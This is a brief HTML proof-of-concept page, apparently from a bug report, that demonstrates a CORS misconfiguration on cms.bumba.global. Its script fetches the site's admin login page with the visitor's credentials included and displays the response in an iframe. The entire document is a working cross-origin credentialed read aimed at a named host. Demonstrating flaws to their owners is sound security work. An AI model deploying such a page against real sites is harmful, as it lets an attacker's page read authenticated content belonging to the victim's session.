<!doctype html>
<html>
  <body>
    <h2>CORS PoC â€“ cms.bumba.global</h2>
    <iframe id="output" style="width:100%; height:500px; border:1px solid black;"></iframe>
    <script>
      fetch('https://cms.bumba.global/admin/auth/login', {
        credentials: 'include'
      })
      .then(res => res.text())
      .then(html => {
        // show the HTML inside an iframe
        const iframe = document.getElementById('output');
        iframe.srcdoc = html;
      })
      .catch(err => {
        document.body.innerHTML += '<pre>' + err + '</pre>';
      });
    </script>
  </body>
</html>
